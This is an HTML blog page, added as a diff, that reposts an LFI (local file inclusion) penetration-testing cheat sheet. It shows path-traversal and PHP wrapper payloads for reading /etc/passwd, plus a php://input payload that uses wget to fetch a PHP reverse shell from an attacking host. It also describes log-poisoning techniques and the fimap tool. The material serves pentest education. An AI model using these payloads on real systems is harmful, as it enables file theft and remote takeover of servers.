@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="What is an LFI Vulnerability?LFI stands for Local File Includes - it’s a file local inclusion vulnerability that allows an attacker to include files that exist on the target web server. Typically thi">
+<meta name="keywords" content="Hacking,Penetration,转载">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Cheat Sheet LFI">
+<meta property="og:url" content="http://www.okoksec.com/2019/03/03/Cheat-Sheet-LFI/index.html">
+<meta property="og:site_name" content="ZMarvel">
+<meta property="og:description" content="What is an LFI Vulnerability?LFI stands for Local File Includes - it’s a file local inclusion vulnerability that allows an attacker to include files that exist on the target web server. Typically thi">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://www.okoksec.com/img/blog/web-for-penetration-testers/lfi-php-file-hackbar-pentesters-labs.png">
+<meta property="og:updated_time" content="2019-03-03T02:41:47.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Cheat Sheet LFI">
+<meta name="twitter:description" content="What is an LFI Vulnerability?LFI stands for Local File Includes - it’s a file local inclusion vulnerability that allows an attacker to include files that exist on the target web server. Typically thi">
+<meta name="twitter:image" content="http://www.okoksec.com/img/blog/web-for-penetration-testers/lfi-php-file-hackbar-pentesters-labs.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>Cheat Sheet LFI</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/project/">项目</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2019/03/03/Cheat-Sheet-Linux-Commands/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2019/03/02/SecLists/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://www.okoksec.com/2019/03/03/Cheat-Sheet-LFI/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://www.okoksec.com/2019/03/03/Cheat-Sheet-LFI/&text=Cheat Sheet LFI"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://www.okoksec.com/2019/03/03/Cheat-Sheet-LFI/&title=Cheat Sheet LFI"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://www.okoksec.com/2019/03/03/Cheat-Sheet-LFI/&is_video=false&description=Cheat Sheet LFI"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Cheat Sheet LFI&body=Check out this article: http://www.okoksec.com/2019/03/03/Cheat-Sheet-LFI/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://www.okoksec.com/2019/03/03/Cheat-Sheet-LFI/&title=Cheat Sheet LFI"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://www.okoksec.com/2019/03/03/Cheat-Sheet-LFI/&title=Cheat Sheet LFI"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://www.okoksec.com/2019/03/03/Cheat-Sheet-LFI/&title=Cheat Sheet LFI"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://www.okoksec.com/2019/03/03/Cheat-Sheet-LFI/&title=Cheat Sheet LFI"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://www.okoksec.com/2019/03/03/Cheat-Sheet-LFI/&name=Cheat Sheet LFI&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#What-is-an-LFI-Vulnerability"><span class="toc-number">1.</span> <span class="toc-text">What is an LFI Vulnerability?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#How-to-get-a-Shell-from-LFI"><span class="toc-number">2.</span> <span class="toc-text">How to get a Shell from LFI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Path-Traversal-aka-Directory-Traversal"><span class="toc-number">2.1.</span> <span class="toc-text">Path Traversal aka Directory Traversal</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-Wrapper-expect-LFI"><span class="toc-number">2.2.</span> <span class="toc-text">PHP Wrapper expect:// LFI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-Wrapper-php-file"><span class="toc-number">2.3.</span> <span class="toc-text">PHP Wrapper php://file</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-Wrapper-php-filter"><span class="toc-number">2.4.</span> <span class="toc-text">PHP Wrapper php://filter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#proc-self-environ-LFI-Method"><span class="toc-number">2.5.</span> <span class="toc-text">/proc/self/environ LFI Method</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#proc-self-fd-LFI-Method"><span class="toc-number">2.6.</span> <span class="toc-text">/proc/self/fd/ LFI Method</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fimap-LFI-Pen-Testing-Tool"><span class="toc-number">3.</span> <span class="toc-text">fimap LFI Pen Testing Tool</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fimap-phpinfo-Exploit"><span class="toc-number">3.1.</span> <span class="toc-text">fimap + phpinfo() Exploit</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Cheat Sheet LFI
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">ZMarvel</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-03-03T02:41:47.000Z" itemprop="datePublished">2019-03-03</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/安全技术/">安全技术</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/Hacking/">Hacking</a>, <a class="tag-link" href="/tags/Penetration/">Penetration</a>, <a class="tag-link" href="/tags/转载/">转载</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <a id="more"></a>
+<h2 id="What-is-an-LFI-Vulnerability"><a href="#What-is-an-LFI-Vulnerability" class="headerlink" title="What is an LFI Vulnerability?"></a>What is an LFI Vulnerability?</h2><p>LFI stands for <strong>Local File Includes</strong> - it’s a file local inclusion vulnerability that allows an attacker to include files that exist on the target web server. Typically this is exploited by abusing dynamic file inclusion mechanisms that don’t sanitize user input.</p>
+<p>Scripts that take filenames as parameters without sanitizing the user input are good candidates for LFI vulnerabilities, a good example would be the following PHP script <code>foo.php?file=image.jpg</code> which takes <code>image.jpg</code> as a parameter. An attacker would simply replace <code>image.jpg</code> and insert a payload. Normally a directory traversal payload is used that escapes the script directory and traverses the filesystem directory structure, exposing sensitive files such as <code>foo.php?file=../../../../../../../etc/passwd</code> or sensitive files within the web application itself. Exposing sensitive information or configuration files containing SQL usernames and passwords.</p>
+<p>Note: In some cases, depending on the nature of the LFI vulnerability it’s possible to run system executables.</p>
+<h2 id="How-to-get-a-Shell-from-LFI"><a href="#How-to-get-a-Shell-from-LFI" class="headerlink" title="How to get a Shell from LFI"></a>How to get a Shell from LFI</h2><p>Below are some techniques I’ve used in the past to gain a shell on systems with vulnerable LFI scripts exposed.</p>
+<hr>
+<h3 id="Path-Traversal-aka-Directory-Traversal"><a href="#Path-Traversal-aka-Directory-Traversal" class="headerlink" title="Path Traversal aka Directory Traversal"></a>Path Traversal aka Directory Traversal</h3><p>As mentioned above Traverse the filesystem directory structure to disclose sensitive information about the system that can help you gain a shell, usernames / passwords etc.</p>
+<hr>
+<h3 id="PHP-Wrapper-expect-LFI"><a href="#PHP-Wrapper-expect-LFI" class="headerlink" title="PHP Wrapper expect:// LFI"></a>PHP Wrapper expect:// LFI</h3><p>Allows execution of system commands via the php expect wrapper, unfortunately this is not enabled by default.</p>
+<p>An example of PHP expect:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/fileincl/example1.php?page=expect://ls</div></pre></td></tr></table></figure>
+<p>Below is the error received if the PHP expect wrapper is disabled:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Warning: <span class="keyword">include</span>(): Unable to find the wrapper <span class="string">"expect"</span> - did you forget to enable it when you&lt;br&gt; configured PHP? in /<span class="keyword">var</span>/www/fileincl/example1.php on line <span class="number">7</span> Warning: <span class="keyword">include</span>(): Unable to find the&lt;br&gt; wrapper <span class="string">"expect"</span> - did you forget to enable it when you configured PHP? in &lt;br&gt; /<span class="keyword">var</span>/www/fileincl/example1.php on line <span class="number">7</span> Warning: <span class="keyword">include</span>(expect:<span class="comment">//ls): failed to open stream: No such file or directory in /var/www/fileincl/example1.php on line 7 Warning: include(): Failed opening 'expect://ls' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in /var/www/fileincl/example1.php on line 7</span></div></pre></td></tr></table></figure>
+<hr>
+<h3 id="PHP-Wrapper-php-file"><a href="#PHP-Wrapper-php-file" class="headerlink" title="PHP Wrapper php://file"></a>PHP Wrapper php://file</h3><p>Another PHP wrapper, <code>php://input</code> your payload is sent in a POST request using curl, burp or hackbar to provide the post data is probably the easiest option.</p>
+<p><img src="/img/blog/web-for-penetration-testers/lfi-php-file-hackbar-pentesters-labs.png" alt="LFI php://file hackbar"></p>
+<p>Example:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.183.128/fileincl/example1.php?page=php://input</div></pre></td></tr></table></figure>
+<p>Post Data payload, try something simple to start with like: ``</p>
+<p>Then try and download a <a href="https://highon.coffee/blog/reverse-shell-cheat-sheet/" target="_blank" rel="external">reverse shell</a> from your attacking machine using:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;? system(<span class="string">'wget http://192.168.183.129/php-reverse-shell.php -O /var/www/shell.php'</span>);?&gt;</div></pre></td></tr></table></figure>
+<p>After uploading execute the reverse shell at <code>http://192.168.183.129/shell.php</code></p>
+<hr>
+<h3 id="PHP-Wrapper-php-filter"><a href="#PHP-Wrapper-php-filter" class="headerlink" title="PHP Wrapper php://filter"></a>PHP Wrapper php://filter</h3><p>Another PHP wrapper, <code>php://filter</code> in this example the output is encoded using base64, so you’ll need to decode the output.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.155.131/fileincl/example1.php?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd</div></pre></td></tr></table></figure>
+<hr>
+<h3 id="proc-self-environ-LFI-Method"><a href="#proc-self-environ-LFI-Method" class="headerlink" title="/proc/self/environ LFI Method"></a>/proc/self/environ LFI Method</h3><p>If it’s possible to include <code>/proc/self/environ</code> from your vulnerable LFI script, then code execution can be leveraged by manipulating the <code>User Agent</code> parameter with Burp. After the PHP code has been introduced <code>/proc/self/environ</code> can be executed via your vulnerable LFI script.</p>
+<hr>
+<h3 id="proc-self-fd-LFI-Method"><a href="#proc-self-fd-LFI-Method" class="headerlink" title="/proc/self/fd/ LFI Method"></a>/proc/self/fd/ LFI Method</h3><p>Similar to the previous <code>/proc/self/environ</code> method, it’s possible to introduce code into the proc log files that can be executed via your vulnerable LFI script. Typically you would use burp or curl to inject PHP code into the <code>referer</code>.</p>
+<p>This method is a little tricky as the proc file that contains the Apache error log information changes under <code>/proc/self/fd/</code> e.g. <code>/proc/self/fd/2</code>, <code>/proc/self/fd/10</code> etc. I’d recommend brute forcing the directory structure of the /proc/self/fd/ directory with Burp Intruder + FuzzDB’s <a href="https://github.com/tennc/fuzzdb/blob/master/dict/BURP-PayLoad/LFI/LFI-FD-check.txt" target="_blank" rel="external">LFI-FD-Check.txt</a> list of likely proc files, you can then monitor the returned page sizes and investigate.</p>
+<hr>
+<h2 id="fimap-LFI-Pen-Testing-Tool"><a href="#fimap-LFI-Pen-Testing-Tool" class="headerlink" title="fimap LFI Pen Testing Tool"></a>fimap LFI Pen Testing Tool</h2><p>fimap is a <a href="/blog/penetration-testing-tools-cheat-sheet/">tool used on pen tests</a> that automates the above processes of discovering and exploiting LFI scripts. Upon discovering a vulnerable LFI script fimap will enumerate the local filesystem and search for writable log files or locations such as <code>/proc/self/environ</code>. Another tool commonly used by pen testes to automate LFI discovery is Kali’s dotdotpwn, which works in a similar way.</p>
+<hr>
+<h3 id="fimap-phpinfo-Exploit"><a href="#fimap-phpinfo-Exploit" class="headerlink" title="fimap + phpinfo() Exploit"></a>fimap + phpinfo() Exploit</h3><p>Fimap exploits PHP’s temporary file creation via Local File Inclusion by abusing PHPinfo() information disclosure glitch to reveal the location of the created temporary file.</p>
+<p>If a phpinfo() file is present, it’s usually possible to get a shell, if you don’t know the location of the phpinfo file fimap can probe for it, or you could use a tool like OWASP DirBuster.</p>
+<p>Enjoy.</p>
+<p>原文链接: <a href="http://highon.coffee/" target="_blank" rel="external">HighOn.Coffee</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/project/">项目</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#What-is-an-LFI-Vulnerability"><span class="toc-number">1.</span> <span class="toc-text">What is an LFI Vulnerability?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#How-to-get-a-Shell-from-LFI"><span class="toc-number">2.</span> <span class="toc-text">How to get a Shell from LFI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Path-Traversal-aka-Directory-Traversal"><span class="toc-number">2.1.</span> <span class="toc-text">Path Traversal aka Directory Traversal</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-Wrapper-expect-LFI"><span class="toc-number">2.2.</span> <span class="toc-text">PHP Wrapper expect:// LFI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-Wrapper-php-file"><span class="toc-number">2.3.</span> <span class="toc-text">PHP Wrapper php://file</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-Wrapper-php-filter"><span class="toc-number">2.4.</span> <span class="toc-text">PHP Wrapper php://filter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#proc-self-environ-LFI-Method"><span class="toc-number">2.5.</span> <span class="toc-text">/proc/self/environ LFI Method</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#proc-self-fd-LFI-Method"><span class="toc-number">2.6.</span> <span class="toc-text">/proc/self/fd/ LFI Method</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fimap-LFI-Pen-Testing-Tool"><span class="toc-number">3.</span> <span class="toc-text">fimap LFI Pen Testing Tool</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fimap-phpinfo-Exploit"><span class="toc-number">3.1.</span> <span class="toc-text">fimap + phpinfo() Exploit</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://www.okoksec.com/2019/03/03/Cheat-Sheet-LFI/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://www.okoksec.com/2019/03/03/Cheat-Sheet-LFI/&text=Cheat Sheet LFI"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://www.okoksec.com/2019/03/03/Cheat-Sheet-LFI/&title=Cheat Sheet LFI"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://www.okoksec.com/2019/03/03/Cheat-Sheet-LFI/&is_video=false&description=Cheat Sheet LFI"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Cheat Sheet LFI&body=Check out this article: http://www.okoksec.com/2019/03/03/Cheat-Sheet-LFI/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://www.okoksec.com/2019/03/03/Cheat-Sheet-LFI/&title=Cheat Sheet LFI"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://www.okoksec.com/2019/03/03/Cheat-Sheet-LFI/&title=Cheat Sheet LFI"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://www.okoksec.com/2019/03/03/Cheat-Sheet-LFI/&title=Cheat Sheet LFI"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://www.okoksec.com/2019/03/03/Cheat-Sheet-LFI/&title=Cheat Sheet LFI"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://www.okoksec.com/2019/03/03/Cheat-Sheet-LFI/&name=Cheat Sheet LFI&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 赵猛
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/project/">项目</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+    <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?e1a5545e21e47c2e4f88aba69902c5c6";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
